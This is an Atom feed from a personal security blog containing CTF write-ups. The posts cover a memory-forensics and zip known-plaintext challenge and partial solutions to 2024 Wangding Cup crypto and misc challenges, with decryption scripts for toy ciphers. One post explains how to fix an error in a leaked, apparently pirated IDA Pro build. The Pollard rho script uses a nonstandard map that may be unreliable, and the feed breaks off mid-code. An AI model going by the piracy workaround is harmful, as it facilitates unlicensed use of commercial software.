<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CY&#39;s Blog</title>
  
  
  <link href="https://reputati0n.github.io/atom.xml" rel="self"/>
  
  <link href="https://reputati0n.github.io/"/>
  <updated>2025-06-10T02:20:25.491Z</updated>
  <id>https://reputati0n.github.io/</id>
  
  <author>
    <name>reputati0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记录最近做的一些题</title>
    <link href="https://reputati0n.github.io/2025/05/22/some-ctf-misc-note/"/>
    <id>https://reputati0n.github.io/2025/05/22/some-ctf-misc-note/</id>
    <published>2025-05-22T08:02:27.000Z</published>
    <updated>2025-06-10T02:20:25.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一大碗冰粉"><a href="#一大碗冰粉" class="headerlink" title="一大碗冰粉"></a>一大碗冰粉</h2><p><img src="/../images/ctf-some-misc/488ac735477f5cccc19e526db83a680b.png" alt="题目截图"></p><p>拿到一个内存镜像，很明显取证题目，使用 LovelyMem 分析之</p><p><img src="/../images/ctf-some-misc/sdc7s8dfn123n7csdf.png" alt="LovelyMem 分析"></p><p>拿到两个文件，一个 hint 一个 secret.zip，打开 hint 发现内容为：doyouknowplaintextattack</p><p><img src="/../images/ctf-some-misc/2bnsmqisdj2mma11.png" alt="hint"></p><p>很明显是 zip 已知明文攻击，攻击之，最后得到解密完的文件：</p><p><img src="/../images/ctf-some-misc/5asdasda12123nfnmsf.png" alt="恢复成功"></p><p><img src="/../images/ctf-some-misc/3iadmasd423432.png" alt="search 文件"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一大碗冰粉&quot;&gt;&lt;a href=&quot;#一大碗冰粉&quot; class=&quot;headerlink&quot; title=&quot;一大碗冰粉&quot;&gt;&lt;/a&gt;一大碗冰粉&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/../images/ctf-some-misc/488ac735477f5cccc19e526</summary>
      
    
    
    
    <category term="CTF" scheme="https://reputati0n.github.io/categories/CTF/"/>
    
    
    <category term="Misc" scheme="https://reputati0n.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>macOS IDA Pro 9.0 报错解决</title>
    <link href="https://reputati0n.github.io/2025/01/09/idapro9-0-arm-macos-fix/"/>
    <id>https://reputati0n.github.io/2025/01/09/idapro9-0-arm-macos-fix/</id>
    <published>2025-01-09T02:28:38.000Z</published>
    <updated>2025-01-09T08:00:11.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>无论是 intel 还是 arm 的 macOS，安装了泄露的 IDA Pro 9.0rc 之后都会面临一个报错如下：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;IDA Professional 9.0.app&#x2F;Contents&#x2F;MacOS&#x2F;plugins&#x2F;ida_feeds&#x2F;ida_feeds.py: name &#39;IdaPluginForm&#39; is not definedTraceback (most recent call last):  File &quot;&#x2F;Applications&#x2F;IDA Professional 9.0.app&#x2F;Contents&#x2F;MacOS&#x2F;python&#x2F;ida_idaapi.py&quot;, line 574, in IDAPython_ExecScript    exec(code, g)    &#96;&#96;&#96;~^^^^^^^^^  File &quot;&#x2F;Applications&#x2F;IDA Professional 9.0.app&#x2F;Contents&#x2F;MacOS&#x2F;plugins&#x2F;ida_feeds&#x2F;ida_feeds.py&quot;, line 45, in &lt;module&gt;    class IdaMainWindow(IdaPluginForm):                        ^^^^^^^^^^^^^NameError: name &#39;IdaPluginForm&#39; is not defined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本篇文章的解决方法对于这两种架构的 mac 都是适用的。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="找到两个目录"><a href="#找到两个目录" class="headerlink" title="找到两个目录"></a>找到两个目录</h3><h4 id="第一个目录"><a href="#第一个目录" class="headerlink" title="第一个目录"></a>第一个目录</h4><p><code>/Applications/IDA Professional 9.0.app/Contents/MacOS/idalib/python</code></p><p>在当前目录下，执行以下命令</p><p><code>pip install .</code></p><h4 id="第二个目录"><a href="#第二个目录" class="headerlink" title="第二个目录"></a>第二个目录</h4><p><code>/Applications/IDA Professional 9.0.app/Contents/MacOS/plugins/ida_feeds</code></p><p>在当前目录下，执行以下命令</p><p><code>pip install -r requirements.txt</code></p><h3 id="切换-python-版本"><a href="#切换-python-版本" class="headerlink" title="切换 python 版本"></a>切换 python 版本</h3><p>找到以下文件<br><code>/Applications/IDA Professional 9.0.app/Contents/MacOS/idapyswitch</code></p><p>这个脚本用来切换 IDA 使用的 Python 环境</p><p>执行以下命令</p><p><code>idapyswitch --force-path /Users/reputati0n/.pyenv/versions/3.9.9/lib/libpython3.9.dylib</code></p><p>如果你跟我一样使用 pyenv 来管理 Python 环境，那这条命令照着写就行，只需要把 Python 路径改成你自己的。</p><h2 id="简单解释"><a href="#简单解释" class="headerlink" title="简单解释"></a>简单解释</h2><p>再啰嗦两句，其实就是安装缺失的依赖包，但是因为安装依赖包的时候使用的是系统环境变量里的 Python，所以最后要有一个切换的操作，就这样。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前情提要&quot;&gt;&lt;a href=&quot;#前情提要&quot; class=&quot;headerlink&quot; title=&quot;前情提要&quot;&gt;&lt;/a&gt;前情提要&lt;/h2&gt;&lt;p&gt;无论是 intel 还是 arm 的 macOS，安装了泄露的 IDA Pro 9.0rc 之后都会面临一个报错如下：&lt;/p</summary>
      
    
    
    
    <category term="Tools" scheme="https://reputati0n.github.io/categories/Tools/"/>
    
    
    <category term="ida" scheme="https://reputati0n.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>2024 网鼎杯资格赛 WP - 白虎赛道(部分)</title>
    <link href="https://reputati0n.github.io/2024/10/29/ctf-wp-wangding/"/>
    <id>https://reputati0n.github.io/2024/10/29/ctf-wp-wangding/</id>
    <published>2024-10-29T03:06:53.000Z</published>
    <updated>2025-04-17T01:33:58.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Crypto01"><a href="#Crypto01" class="headerlink" title="Crypto01"></a>Crypto01</h2><p>问AI&#x20;</p><p>提出可以用已知明文攻击，因为平台flag 格式统一，所以密文中肯定包含 wdflag{ 这样的字符串</p><p>进一步分析加密过程，脚本包含多轮加密操作，存在异或操作，加密过程重复14 次</p><p>分析完加密过程后，推导出解密过程</p><p>首先利用一直明文攻击匹配出密钥，使用密钥尝试解密，因为密文分块，所以每个密文块都要重新解方程，最终获取到每个块的明文</p><p>核心代码如下</p><p><img src="/../images/ctf-wp-wd/QQ_1730363468937_Sis4jumdel.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">XorTracing</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> key<span class="token punctuation">,</span> mask<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>from_plain <span class="token operator">=</span> plain        self<span class="token punctuation">.</span>from_key <span class="token operator">=</span> key        self<span class="token punctuation">.</span>from_mask <span class="token operator">=</span> maskperform_xor <span class="token operator">=</span> <span class="token keyword">lambda</span> obj1<span class="token punctuation">,</span> obj2<span class="token punctuation">:</span> XorTracing<span class="token punctuation">(</span>obj1<span class="token punctuation">.</span>from_plain <span class="token operator">^</span> obj2<span class="token punctuation">.</span>from_plain<span class="token punctuation">,</span> obj1<span class="token punctuation">.</span>from_key <span class="token operator">^</span> obj2<span class="token punctuation">.</span>from_key<span class="token punctuation">,</span> obj1<span class="token punctuation">.</span>from_mask <span class="token operator">^</span> obj2<span class="token punctuation">.</span>from_mask<span class="token punctuation">)</span>transformation_chain <span class="token operator">=</span> <span class="token punctuation">[</span>XorTracing<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_chain <span class="token operator">=</span> <span class="token punctuation">[</span>transformation_chain<span class="token punctuation">[</span>P_permutation<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">]</span>    transformation_chain <span class="token operator">=</span> new_chain    new_chain <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> block_size    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> idx <span class="token operator">-</span> IV <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            new_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> perform_xor<span class="token punctuation">(</span>perform_xor<span class="token punctuation">(</span>XorTracing<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MASK <span class="token operator">>></span> idx <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> XorTracing<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            new_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> perform_xor<span class="token punctuation">(</span>perform_xor<span class="token punctuation">(</span>XorTracing<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MASK <span class="token operator">>></span> idx <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> transformation_chain<span class="token punctuation">[</span>idx <span class="token operator">-</span> IV<span class="token punctuation">]</span><span class="token punctuation">)</span>    transformation_chain <span class="token operator">=</span> new_chain    new_chain <span class="token operator">=</span> <span class="token punctuation">[</span>perform_xor<span class="token punctuation">(</span>transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> XorTracing<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">]</span>    transformation_chain <span class="token operator">=</span> new_chain    new_chain <span class="token operator">=</span> <span class="token punctuation">[</span>transformation_chain<span class="token punctuation">[</span>inverse_P_permutation<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">]</span>    transformation_chain <span class="token operator">=</span> new_chain<span class="token keyword">for</span> candidate_byte <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    initial_plaintext <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">b'wdflag&#123;'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>candidate_byte<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    equations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        equation_component <span class="token operator">=</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_key        computed_value <span class="token operator">=</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_mask <span class="token operator">+</span> <span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> idx <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> inner_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>            computed_value <span class="token operator">+=</span> <span class="token punctuation">(</span>transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_plain <span class="token operator">&amp;</span> initial_plaintext<span class="token punctuation">)</span> <span class="token operator">>></span> inner_idx <span class="token operator">&amp;</span> <span class="token number">1</span>        computed_value <span class="token operator">%=</span> <span class="token number">2</span>        bit_set <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> inner_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>equation_component <span class="token operator">>></span> inner_idx<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>                bit_set<span class="token punctuation">.</span>add<span class="token punctuation">(</span>inner_idx<span class="token punctuation">)</span>        equations<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>bit_set<span class="token punctuation">,</span> computed_value <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>bit_set<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    solver_instance <span class="token operator">=</span> XorSolver<span class="token punctuation">(</span>equations<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solver_instance<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    derived_key <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token builtin">list</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span> result <span class="token keyword">for</span> entry<span class="token punctuation">,</span> result <span class="token keyword">in</span> solver_instance<span class="token punctuation">.</span>eqns<span class="token punctuation">&#125;</span>    decrypted_bytes <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">for</span> cipher_chunk <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>        equations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">63</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>            equation_component <span class="token operator">=</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_plain            computed_value <span class="token operator">=</span> transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_mask <span class="token operator">+</span> <span class="token punctuation">(</span>cipher_chunk <span class="token operator">>></span> idx <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> inner_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                computed_value <span class="token operator">+=</span> <span class="token punctuation">(</span>transformation_chain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>from_key <span class="token operator">>></span> inner_idx <span class="token operator">&amp;</span> derived_key<span class="token punctuation">.</span>get<span class="token punctuation">(</span>inner_idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            computed_value <span class="token operator">%=</span> <span class="token number">2</span>            bit_set <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> inner_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>equation_component <span class="token operator">>></span> inner_idx<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>                    bit_set<span class="token punctuation">.</span>add<span class="token punctuation">(</span>inner_idx<span class="token punctuation">)</span>            equations<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>bit_set<span class="token punctuation">,</span> computed_value<span class="token punctuation">]</span><span class="token punctuation">)</span>        solver_instance <span class="token operator">=</span> XorSolver<span class="token punctuation">(</span>equations<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>        solution <span class="token operator">=</span> solver_instance<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        plaintext_chunk <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> entry<span class="token punctuation">,</span> result <span class="token keyword">in</span> solver_instance<span class="token punctuation">.</span>eqns<span class="token punctuation">)</span>        decrypted_bytes <span class="token operator">+=</span> long_to_bytes<span class="token punctuation">(</span>plaintext_chunk<span class="token punctuation">)</span>    padding_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>decrypted_bytes<span class="token punctuation">)</span> <span class="token operator">-</span> decrypted_bytes<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b'&#125;'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">if</span> decrypted_bytes<span class="token punctuation">[</span><span class="token operator">-</span>padding_length<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>padding_length<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> padding_length<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_bytes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Crypto02"><a href="#Crypto02" class="headerlink" title="Crypto02"></a>Crypto02</h2><p>看到题目只能想到分解 N，为了分解N，我们只需要运用Pollard’s ρ algorithm，脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">%</span> b    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">mapx</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">%</span> n  <span class="token comment"># Using modular exponentiation to reduce size</span>    <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">pollard_rho</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        x1 <span class="token operator">=</span> mapx<span class="token punctuation">(</span>x1<span class="token punctuation">)</span>        x2 <span class="token operator">=</span> mapx<span class="token punctuation">(</span>mapx<span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>x1 <span class="token operator">-</span> x2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">elif</span> p <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p:"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q:"</span><span class="token punctuation">,</span> n <span class="token operator">//</span> p<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pollard_rho<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>n <span class="token operator">=</span>  <span class="token comment">#题目给的</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/ctf-wp-wd/QQ_1730362545692_poV2rFY0oE.png"></p><p>拿到e、N、p、q 之后解密文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> inverse<span class="token comment"># 已知的公钥 e 和模数 N</span>e <span class="token operator">=</span> <span class="token number">65537</span>N <span class="token operator">=</span> <span class="token comment"># 假设您已经知道 p 和 q</span><span class="token comment"># 这里是伪代码，您需要找到 p 和 q。</span>p <span class="token operator">=</span> q <span class="token operator">=</span> <span class="token comment"># 计算私钥 d</span>phi_N <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_N<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">int2str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> tmp    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 解密过程</span>    plain <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>    <span class="token keyword">return</span> int2str<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token comment"># 从文件中读取密文</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    cipher_bytes <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 将字节转换为整数</span>    ciphertext <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>cipher_bytes<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token comment"># 解密</span>plaintext <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token comment"># 输出解密结果</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted plaintext:"</span><span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/ctf-wp-wd/QQ_1730362713916_wyguFPECYo.png"></p><h2 id="Misc01"><a href="#Misc01" class="headerlink" title="Misc01"></a>Misc01</h2><p>过滤 gtp 协议，两个访问错误的包，两个包在一个流里</p><p>拼接 teid 的值即可获取 flag</p><p><img src="/../images/ctf-wp-wd/QQ_1730364472092_x5Bm933G6O.png"></p><p><img src="/../images/ctf-wp-wd/QQ_1730364507118_ZrM1rNR7zo.png"></p><h2 id="Misc02"><a href="#Misc02" class="headerlink" title="Misc02"></a>Misc02</h2><p>gtp 数据包的 upd 负载中，存在加密字节，加密方式为 AES-ECB，所以通过提取 UDP 负载的特定部分并将其转换为整数，作为密钥，将负载的其余部分转换为字节，然后进行解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend<span class="token keyword">import</span> struct<span class="token keyword">import</span> pyshark<span class="token keyword">def</span> <span class="token function">d</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>I'</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span>    ciph <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>ECB<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dec <span class="token operator">=</span> ciph<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dec<span class="token punctuation">.</span>update<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> dec<span class="token punctuation">.</span>finalize<span class="token 